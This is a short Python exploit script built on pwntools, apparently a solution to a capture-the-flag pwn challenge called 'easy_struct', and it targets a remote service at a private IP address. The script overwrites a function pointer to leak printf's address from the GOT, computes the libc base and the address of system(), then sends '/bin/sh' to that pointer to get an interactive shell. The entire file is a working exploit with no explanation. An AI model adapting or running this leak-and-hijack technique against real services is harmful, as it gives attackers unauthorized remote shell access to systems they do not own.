from pwn import *

elf=ELF('./easy_struct')
# p=process('./easy_struct')
p=remote('10.10.175.204',9996)
libc=ELF('./libc.so.6')
p.recv()
payload=b'%s\n'.ljust(16,b'\x00')+p64(elf.plt['printf'])+p64(elf.got['printf'])
p.send(payload)
r=p.recv()
printf_addr=u64(r[:6].ljust(8,b'\x00'))
info('printf_addr:0x%X'%printf_addr)
libc_base=printf_addr-libc.sym['printf']
info('libc_base:0x%X'%libc_base)
system_addr=libc_base+libc.sym['system']
p.send(b'/bin/sh'.ljust(16,b'\x00')+p64(system_addr)+p64(0))
p.interactive()